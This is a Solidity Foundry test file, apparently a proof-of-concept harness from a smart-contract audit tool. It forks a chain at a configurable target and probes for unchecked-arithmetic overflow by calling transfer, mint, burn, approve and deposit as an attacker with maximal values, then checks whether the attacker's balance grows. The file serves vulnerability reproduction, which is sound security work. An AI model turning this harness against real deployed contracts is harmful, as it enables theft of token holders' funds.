// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Unchecked arithmetic wraps (no overflow check)
/// @notice Detector: unchecked-block. The target does arithmetic in an
///         `unchecked {}` block (or pre-0.8 code with no SafeMath), so
///         values WRAP instead of reverting -- minting, balances, and
///         accounting can overflow into tiny / huge values.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh.
///
///      This harness does NOT guess a single entry point. It tries every
///      plausible balance-mutating entry point and accepts the first that
///      produces the class OBSERVABLE -- the attacker's balance GROWS by an
///      impossible amount (the wrap). A call that merely RETURNS is never
///      treated as a reproduction.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// Read a balance through the target's balanceOf(address), if it has one.
    /// The balance READER is a guess too. A single name here means "the target
    /// is not the kind of token we assumed", which reads as "not reproduced"
    /// exactly like a wrong exploit entry point does.
    function _balanceOf(address who) internal view returns (bool found, uint256 bal) {
        (bool ok, bytes memory ret) =
            target.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("getBalance(address)", who));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("balanceOf(address,uint256)", who, uint256(0)));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("shares(address)", who));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        return (false, 0);
    }

    /// Try ONE candidate and accept it only when the class OBSERVABLE
    /// changes -- never because the call returned.
    /// `before` is the attacker's balance snapshot.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(attacker);
        (bool ok,) = target.call(data);
        (bool found, uint256 afterBal) = _balanceOf(attacker);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        // OBSERVABLE (unchecked wrap): the attacker's balance GREW by an
        // impossible amount. A call that merely returned, or that left the
        // balance flat, is not the wrap.
        if (ok && found && afterBal > before) return label;
        return "";
    }

    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        used = _attempt(
            attacker,
            before,
            "transfer(address,uint256)",
            abi.encodeWithSignature("transfer(address,uint256)", attacker, type(uint256).max)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "mint(address,uint256)",
            abi.encodeWithSignature("mint(address,uint256)", attacker, type(uint256).max)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "burn(uint256)",
            abi.encodeWithSignature("burn(uint256)", type(uint256).max)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "approve(address,uint256)",
            abi.encodeWithSignature("approve(address,uint256)", attacker, type(uint256).max)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "deposit(uint256)",
            abi.encodeWithSignature("deposit(uint256)", type(uint256).max)
        );
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        (bool found, uint256 before) = _balanceOf(attackerEOA);
        require(found, "no balance reader worked (tried balanceOf(address), getBalance(address), balanceOf(address,uint256), shares(address)), so the wrap cannot be observed. This does NOT establish safety.");

        // OBSERVABLE snapshot: the attacker's balance. Reproduced = it GROWS.
        string memory used = _tryEntry(attackerEOA, before);

        assertTrue(
            bytes(used).length > 0,
            "not reproduced via any tried entry point. Candidates tried: transfer(address,uint256), mint(address,uint256), burn(uint256), approve(address,uint256), deposit(uint256) -- each either RETURNED (a no-op) or left the attacker's balance unchanged. This does NOT establish safety: the unchecked arithmetic may be reached under another name or argument shape. Adapt the candidate list."
        );
        (, uint256 afterBal) = _balanceOf(attackerEOA);
        console.log("unchecked wrap reproduced via", used);
        console.log("attacker balance before:", before);
        console.log("attacker balance after:", afterBal);
    }
}
